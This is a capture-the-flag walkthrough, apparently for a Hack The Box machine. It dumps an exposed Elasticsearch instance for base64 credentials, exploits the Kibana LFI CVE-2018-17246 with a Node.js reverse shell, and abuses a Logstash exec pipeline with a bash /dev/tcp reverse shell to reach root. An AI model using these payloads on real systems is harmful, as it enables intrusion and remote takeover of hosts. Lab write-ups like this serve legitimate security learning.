![](./logo.png)

# USER

`nmap` shows a `http` server on port 80. This page displays a photo of a needle.

Running `strings` provides us with the base64 string:

Translating the string: 
```
(base64)    bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==

(Spanish)   la aguja en el pajar es "clave"

(English)   the needle in the haystack is "key"
```
Port 9200 shows an `elasticsearch` instance

Running it with

```
http://10.10.10.115:9200/*
```

Shows all the tables available

```
http://10.10.10.115:9200/<table_name>/_search
```

Dumping all the data can be achieved using https://github.com/taskrabbit/elasticsearch-dump

Example command:
```
elasticdump --input=http://10.10.10.115:9200/quotes --output=./quotes.dump
```

Searching for the word `clave` gives us the lines:

```
Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg
Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=
```

The `base64` gives:

```
user: security 
pass: spanish.is.key
```

These allow logging on via `ssh`. This lets us grab the `user.txt`!

# ROOT

This command exposes the `kibana` service to our local machine.
```
ssh -L 5601:127.0.0.1:5601 security@10.10.10.115
```

This allows us to use our web browser to view the `kibana` console

Going to try this exploit `CVE-2018-17246 - Kibana LFI < 6.4.3 & 5.6.13`

Payload:
```
/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../<SHELL_LOCATION>
```

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(6868, "10.10.14.55", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

Running enum scripts show us that there are three config files present in the `/etc/logstash/conf.d` that work with a service know as `logstash`.

There is an `input.conf`, `filter.conf` and an `output.conf`.

The `input.conf` defines the triggers. As can be seen below any logs placed in the path `"/opt/kibana/logstash_*"` will trigger the `logstash` service to pass the data to the `filter.conf`. 

```conf
input {
	file {
		path => "/opt/kibana/logstash_*"
		start_position => "beginning"
		sincedb_path => "/dev/null"
		stat_interval => "10 second"
		type => "execute"
		mode => "read"
	}
}
```

The `filter.conf` then decides wether to pass the data onto the `output.conf`. The filter here checks if the contents matches the regex defined in the `match` section.

```conf
filter {
	if [type] == "execute" {
		grok {
			match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
		}
	}
}
```

If there is a match it is passed to the `output.conf`. This file will then execute the command parsed in the `filter.conf`.

```conf
output {
	if [type] == "execute" {
		stdout { codec => json }
		exec {
			command => "%{comando} &"
		}
	}
}
```

Brining this all together means that running the command below will provide us with RCE and a `root` shell due to the command being excuted by `logstash`

```bash
echo "Ejecutar comando: bash -i >& /dev/tcp/10.10.14.55/7000 0>&1" > /opt/kibana/logstash_1
```

This payload works and provies us with a root shell!